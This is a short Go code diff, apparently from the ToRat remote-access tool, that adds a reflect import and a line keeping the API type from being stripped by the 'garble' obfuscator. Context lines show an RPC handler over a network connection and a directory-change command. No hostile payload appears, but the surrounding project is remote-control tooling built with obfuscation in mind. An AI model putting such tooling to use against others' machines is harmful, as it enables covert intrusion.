@@ -8,6 +8,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"reflect"
 	"runtime"
 
 	"github.com/lu4p/ToRat/models"
@@ -121,6 +122,9 @@ func (a *API) Cd(path string, r *models.Dir) (err error) {
 	r.Files, err = filepath.Glob("*")
 	return err
 }
+
+// Make sure API is never garbled.
+var _ = reflect.TypeOf(API(0))
 
 func RPC(c net.Conn) {
 	api := new(API)
